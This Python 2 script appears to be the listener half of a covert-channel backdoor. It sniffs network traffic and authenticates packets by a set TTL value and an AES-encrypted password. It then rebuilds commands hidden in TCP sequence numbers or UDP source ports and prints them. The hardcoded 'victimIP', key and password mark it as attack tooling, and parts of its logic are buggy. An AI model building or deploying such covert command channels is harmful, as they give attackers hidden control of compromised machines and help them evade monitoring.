from scapy.all import *
from Crypto.Cipher import AES
# Inputs
victimIP = "192.168.0.16"
ttlKey = 164
srcPort = 80
dstPort = 53
key = "0123456789abcdef"
IV = "abcdefghijklmnop"
commands = []
authentication = "TEST!"


def decrypt(command):
    global key
    global IV
    decryptor = AES.new(key, AES.MODE_CFB, IV=IV)
    plain = decryptor.decrypt(command)
    return plain


def encryptCommand(command):
    global key
    global IV
    encryptor = AES.new(key, AES.MODE_CFB, IV=IV)
    plain = encryptor.encrypt(command)
    return plain


def addToCommands(commands, UID, total, covertContent):
    # Edge case if command array is empty
    if(len(commands) == 0):
        #print 'Commands is empty, creating a new element'
        element = [UID, [int(total)], [covertContent]]
        commands.append(element)
        #print commands
        # The first element of COmmand has UID
        # print commands[0][1]
        # print "\n\n\n\n"
    # If the commands array is NOT empty, search by UID
    else:
        #print "Commands not empty"
        # # find the element which has the same UID
        # for element in commands:
        #     if(element[0] == UID):
        #         print "There is an existing element with same UID"
        #         element[2].append(covertContent)
        #         # print commands
        #     # If NONE of the elements have the same UID, create a
        #     # new entry
        #     else:
        #         print "There are no elements with the same UID"
        #         element = [UID, [int(total)], [covertContent]]
        #         commands.append(element)
        #     pass


        #PsuedoCode
        #Check the current list of commands
        # if there is already some commands witht he same UID
        # then append it to that.
        for x in range(len(commands)):
            if(commands[x][0] == UID):
                #print "There is an existing element with same UID"
                commands[x][2].append(covertContent)
                return;
                # print commands
            pass
        # If NONE of the elements have the same UID, create a
        # new entry
        print "There are no elements with the same UID"
        element = [UID, [int(total)], [covertContent]]
        commands.append(element)



def checkCommands(UID):
    #print "--Checking Commands--"
    # for element in commands:
    #     print element
    #     if(element[0] == UID):
    #         total = element[1][0]
    #         print "The total amount of commands is " + str(total)
    #         numMessages = len(element[2])
    #         print "The number of messages is " + str(numMessages)
    #         if(numMessages == total):
    #             return True
    #         else:
    #             print "Here"
    #             return False
    #     pass
    #     return False
    #print(commands)
    for x in range(len(commands)):
        element = commands[x]
        #print element[0]
        if(element[0] == UID):
            #print "ELEMENT = UID"
            total = element[1][0]
            #print "The total amount of commands is " + str(total)
            numMessages = len(element[2])
            #print "The number of messages is " + str(numMessages)
            if(numMessages == total):
                return True
    pass
    return False

def deleteCommand(UID):
    #print "Deleting command with UID " + str(UID)
    #print "Num of elements is " + str(len(commands));
    for x in range(len(commands)):
        element = commands[x]
        #print element[0]
        if(element[0] == UID):
            del commands[x]
    pass
    #print "After delete, the lenght is " + str(len(commands))

def reconstructCommand(UID):
    #print "Reconstructing command"
    for element in commands:
        # print element
        text = ""
        if(element[0] == UID):
            data = element[2]
            #print data
            for value in data:
                text = text + str(value)
                pass
            # print text
            #Split into chunks of 8
            line = text
            n = 8
            chunks = [line[i:i+n] for i in range(0, len(line), n)]
            #Convert each element in array to integer
            # print "chunks is " + str(chunks)
            for x in range(0, len(chunks)):
                 chunks[x] = int(chunks[x], 2)
                 chunks[x] = chr(chunks[x])
            # print chunks
            return ''.join(chunks)
        pass


def authenticate(packet):
    global command
    global authentication
    # Check TTL first
    ttl = packet[IP].ttl
    # Checks if the ttl matches with ours
    if ttl == ttlKey:
        # Check the password in the payload
        payload = packet["Raw"].load
        # Decrypt payload, sequence number
        decryptedData = decrypt(payload)
        # print "Packet payload " + decryptedData
        # Check if password in payload is correct
        password = decryptedData.split("\n")[0]
        #password = payload[0]
        # print "Password: " + password
        if(password == authentication):
            return True
        else:
            return False
    return False


def handle(packet):
    if authenticate(packet):
        payload = decrypt(packet["Raw"].load).split("\n")
        # print "Payload"
        # print payload
        UID = payload[1]
        # print "UID is " + UID
        position = payload[2].split(":")[0]
        # print "Position is " + position
        total = payload[2].split(":")[1]
        # print "Total is " + total

        if(packet.haslayer(TCP)):
            #Define the length
            length = 32
            # decrypt the covert contents
            # print "Covert content = " + str(packet[TCP].seq)
            # convert to binary
            covertContent = bin(packet[TCP].seq)[2:].zfill(length)
            # print "binary is " + covertContent
        elif(packet.haslayer(UDP)):
            length = 16
            # decrypt the covert contents
            # print "Covert content = " + str(packet[UDP].sport)
            # convert to binary
            covertContent = bin(packet[UDP].sport)[2:].zfill(length)
            # print "binary is " + covertContent
        # If there is only 1 message for this command, reconstruct it
        #if(total == 1):
            #DEBUG: print "Only one message, just reconstruct it"
        # Else, add to an array
        if(total != 1):
            #DEBUG: print "Multipart command, add to commands"
            addToCommands(commands, UID, total, covertContent)
            # After every add, check if the max has been reached
            if(checkCommands(UID)):
                #DEBUG: print "Max reached, reconstruct command"
                command = reconstructCommand(UID)
                print "COMMAND: " + command
                #Delete that command from the list
                deleteCommand(UID)
            # else:
                #DEBUG: print "Max not reached, don't reconstruct command yet"


sniff(filter="ip", prn=handle)
